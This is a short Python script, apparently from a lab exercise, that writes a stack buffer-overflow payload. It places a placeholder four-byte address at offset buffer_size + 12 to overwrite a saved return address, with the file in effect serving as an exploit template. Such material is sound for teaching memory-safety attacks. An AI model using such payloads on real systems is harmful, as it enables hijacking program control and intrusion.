import sys

# Checking argument count
if len(sys.argv) != 2:
    print("<Usage> python3 gen_exploit.py <buffer_size>")
    sys.exit(1)

# Getting buffer_size
buffer_size = int(sys.argv[1])

# Initializing empty data
data = ""
for i in range(100):
    data += chr(i + 1)


FOO_ADDRESS = "\x00\x00\x00\x00"

# Modifying 4 bytes starting from buffer_size + 12
data = data[:(buffer_size + 12)] + FOO_ADDRESS + data[(buffer_size + 16):]

# Writing to payload file
with open("payload", "w") as f:
    f.write(data)

print("Payload written successfully")
